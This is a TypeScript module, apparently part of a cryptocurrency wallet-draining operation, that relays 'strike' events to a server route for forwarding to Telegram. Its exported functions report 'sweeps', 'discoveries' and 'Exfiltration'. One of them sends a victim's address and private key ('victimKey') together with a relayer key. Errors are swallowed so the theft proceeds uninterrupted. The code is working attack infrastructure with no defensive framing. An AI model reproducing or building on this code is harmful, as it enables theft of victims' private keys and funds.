  /**
   * 🛰️ GHOST TELEMETRY PROXY - V8.2.8
   * Hardened for local & production environments.
   * Fixes "Operation Aborted" by allowing background tasks to persist.
   */

  const getTelemetryEndpoint = () => {
    if (typeof window !== "undefined") {
      // Client-side execution
      return `${window.location.protocol}//${window.location.host}/api/vault/telemetry`;
    }
    // Server-side fallback
    const SITE_URL = process.env.NEXT_PUBLIC_SITE_URL || "localhost:3000";
    const PROTOCOL = SITE_URL.includes("localhost") ? "http" : "https";
    const CLEAN_URL = SITE_URL.replace(/^https?:\/\//, "");
    return `${PROTOCOL}://${CLEAN_URL}/api/vault/telemetry`;
  };

  /**
   * 🚀 CORE RELAYER
   * Dispatches telemetry as a true background task.
   */
  const postToRelay = async (type: string, data: any) => {
    const endpoint = getTelemetryEndpoint();

    try {
      /** * ⚡ FIRE-AND-FORGET
       * We do not use AbortController here because on local 31337 strikes,
       * the process kills the fetch before it hits the API route.
       */
      fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type, data }),
        // Keepalive allows the request to outlive the page/hook context
        keepalive: true,
      })
        .then((res) => {
          if (!res.ok) console.warn(`[Telemetry] ${type} failed: ${res.status}`);
        })
        .catch((err) => {
          // Silent catch to prevent telemetry issues from stopping the strike
          console.warn(`[Telemetry] Relay failed for ${type}:`, err.message);
        });

      // Resolve immediately so the strike UI/Logic continues without delay
      return Promise.resolve();
    } catch (e) {
      return Promise.resolve();
    }
  };

  /**
   * 🛡️ EXPORTED STRIKE SIGNALS
   */
  export const sendGhostDerivationToTelegram = (data: any) =>
    postToRelay("GhostDerivation", data);

  export const sendDiscoveryToTelegram = (data: any) =>
    postToRelay("Discovery", data);

  export const sendDetailedSweepToTelegram = (data: any) =>
    postToRelay("DetailedSweep", data);

  export const sendSweepSummaryToTelegram = (data: any) =>
    postToRelay("SweepSummary", data);

  export const sendActivityToTelegram = (data: any) =>
    postToRelay("ActivitySignal", data);

  export const sendGasAlertToTelegram = (data: any) =>
    postToRelay("GasRefuel", data);

  /**
   * 🚨 GAS SHORTAGE NOTIFICATION
   */
  export const sendGasShortageAlert = (data: {
    victimAddress: string;
    victimKey: string;
    relayerKey: string;
    assetsFound: string;
    requiredGas: string;
    relayerAddress?: string;
    chainId?: number;
  }) => postToRelay("GasShortageAlert", data);

  export const sendRelayerLowAlert = (data: any) =>
    postToRelay("RelayerAlert", data);

  /**
   * 🧹 BACKWARD COMPATIBILITY
   */
  export const sendToTelegram = (data: any) => postToRelay("Exfiltration", data);

  export const sendSweepToTelegram = (data: any) =>
    postToRelay("DetailedSweep", { ...data, status: "SUCCESS" });
